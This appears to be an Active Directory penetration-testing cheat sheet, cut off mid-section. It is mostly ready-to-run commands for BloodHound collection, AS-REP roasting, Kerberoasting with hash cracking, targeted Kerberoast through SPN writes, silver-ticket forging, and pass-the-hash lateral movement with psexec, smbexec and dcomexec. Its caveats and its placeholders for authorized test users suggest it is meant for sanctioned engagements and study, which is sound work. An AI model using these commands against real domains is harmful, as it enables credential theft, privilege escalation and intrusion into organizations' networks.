State line

Where to look and how to read the output | Investigation command chooser

$s.FindAll() | ForEach-Object { $_.Properties }

SPN ≠ weak password. ACE ≠ effective exploitable control. (Pwn3d!) means administrative SMB context, not every remote protocol. Session output is volatile and can be blocked; session presence ≠ accessible credentials.

BloodHound collection and decision

# Directory-only first pass; avoids workstation contact.
.\SharpHound.exe --CollectionMethods DCOnly --OutputDirectory .\bh --ZipFileName domain-dconly.zip

# Add only when the selected host question needs it.
.\SharpHound.exe --CollectionMethods LocalGroup --ComputerFile .\candidate-hosts.txt --OutputDirectory .\bh --ZipFileName candidate-localgroups.zip
.\SharpHound.exe --CollectionMethods Session --ComputerFile .\candidate-hosts.txt --Loop --LoopDuration 00:10:00 --OutputDirectory .\bh --ZipFileName candidate-sessions.zip

# Linux collector alternative; confirm release/deployment compatibility.
bloodhound-python --help
bloodhound-python -u USER -p 'PASSWORD' -d DOMAIN -ns DC_IP -dc DC_HOST -c All --zip

SharpHound with no flags uses its broader default; All runs every supported collection method and is not the automatic first pass. After import:

  1. mark only principals/hosts actually controlled;
  2. inspect group nesting and outbound control from the current identity;
  3. inspect host-access edges and high-value paths;
  4. classify static-ish ACL/group/GPO edges versus volatile sessions;
  5. manually verify the minimum edge and its route/service.
CONTROLLED PRINCIPAL -> EFFECTIVE RIGHT -> TARGET -> REACHABLE SERVICE
                     -> EXPECTED TRANSITION -> MINIMUM VALIDATION -> NEXT BLOCK

Validate every chosen edge manually; graph presence ≠ effective right, current session or reachable service.

AS-REP roast

Need: known username(s), KDC reachability and preauthentication disabled on the target account. Output: a $krb5asrep$ verifier, not a password.

# One known account
impacket-GetNPUsers 'DOMAIN/TARGET_USER' -no-pass -request -dc-ip DC_IP \
  -format hashcat -outputfile TARGET_USER.asrep

# Supplied username list
impacket-GetNPUsers DOMAIN/ -no-pass -request -usersfile users.txt \
  -dc-ip DC_IP -format hashcat -outputfile asrep.hashes

# Authenticated candidate discovery/request
impacket-GetNPUsers 'DOMAIN/USER:PASSWORD' -request -dc-ip DC_IP \
  -format hashcat -outputfile asrep.hashes

hashcat -m 18200 asrep.hashes wordlist.txt

Rubeus.exe asreproast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:TARGET_USER.asrep /format:hashcat

Empty output can mean no candidate, a bad list/domain/DC, unreachable KDC or tool error. A returned verifier may still be infeasible to crack.

Kerberoast

Need: any valid domain identity, KDC reachability and a selected SPN-bearing account. Output: a TGS verifier for offline guessing.

# Enumerate first without requesting every ticket
impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER:PASSWORD'

# Request one prioritized user account
impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \
  -outputfile TARGET_USER.tgs 'DOMAIN/USER:PASSWORD'

Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat
Prefix / etypeHashcat mode
$krb5tgs$23$13100
$krb5tgs$17$19600
$krb5tgs$18$19700
hashcat -m 13100 TARGET_USER.tgs wordlist.txt

Select by privilege, password age and downstream access. “No entries found” can be a query/auth/DC problem or genuinely no matching user SPN; it does not prove Kerberos is unavailable.

Targeted Kerberoast from SPN write

setspn -S TEMP/TARGET_USER TARGET_USER
setspn -Q TEMP/TARGET_USER
Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat
setspn -D TEMP/TARGET_USER TARGET_USER

Requires effective write access to the user's servicePrincipalName attribute. Use a unique SPN and remove it immediately; this changes directory state.

Silver ticket

impacket-ticketer -nthash SERVICE_OR_MACHINE_NT_HASH -domain-sid DOMAIN_SID \
  -domain DOMAIN -spn cifs/TARGET_HOST AUTHORIZED_TEST_USER
export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"

Requires the exact service/machine key, realm, domain SID and SPN. It is service-scoped; import success is not authorization. Modern PAC checks, wrong naming, stale keys or an unsupported service can invalidate the result.

Preflight and credential classification

nmap -Pn -sT -sV -p 135,139,445,3389,5985,5986 TARGET

(Pwn3d!) is an SMB administrative-context cue, not proof of WinRM, WMI, RDP or every SMB execution method. Port 135 alone does not prove that negotiated dynamic RPC ports are reachable.

SMB, services and scheduled tasks

impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET'
impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
impacket-smbexec 'DOMAIN/USER:PASSWORD@TARGET'

PsExec uploads/starts a RemCom service; SMBExec repeatedly creates services with redirected output; ATExec creates a scheduled task and normally reads output from ADMIN$\Temp. All require more than valid credentials.

WMI/DCOM

impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'

WMIExec normally needs SMB for output even though process creation uses WMI/DCOM. Current Impacket DCOMExec rejects Kerberos for its supported DCOM objects; use WMIExec with Kerberos instead.

Discover and recognize candidates

Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries.

Map Active Directory attack paths

Find: Establish domain identity, DC, DNS, time and route

Start with the session identity and known credential scope; discover the realm/DC and inspect DNS, time and routes.

whoami /all
whoami /upn
nltest /dsgetdc:DOMAIN
w32tm /query /status

Recognize: The named realm/DC and actual identity establish where directory/authentication checks must run.

Validate next: Check DC/service reachability, resolver/SPN naming and clock compatibility, not merely the password.

Establish domain identity, DC, DNS, time and route.

Find: Enumerate directory objects with native, LDAP and PowerView approaches

Use the available built-in/LDAP interface from the verified domain context; inspect one useful user/group before broad graph assumptions.

net user USER /domain
net group "GROUP" /domain

Recognize: Account/group membership supplies a relationship to investigate; nested membership and effective destination rights remain separate.

Validate next: Verify object SID/type, nesting and the exact right granted to that principal.

Enumerate directory objects with native, LDAP and PowerView approaches.

Find: Read domain shares, SYSVOL and NETLOGON for useful artifacts

Enumerate the DC/known file-server shares and inspect relevant SYSVOL/NETLOGON paths under the accepted domain identity.

net view \\DC_HOST
dir \\DOMAIN\SYSVOL
dir \\DOMAIN\NETLOGON

Recognize: A real domain-readable script gives concrete identity/path leads for credential and host investigation.

Validate next: Verify readable artifact content, whether any secret is current and what account/service it belongs to.

Read domain shares, SYSVOL and NETLOGON for useful artifacts.

Find: Identify service accounts and SPNs worth investigating
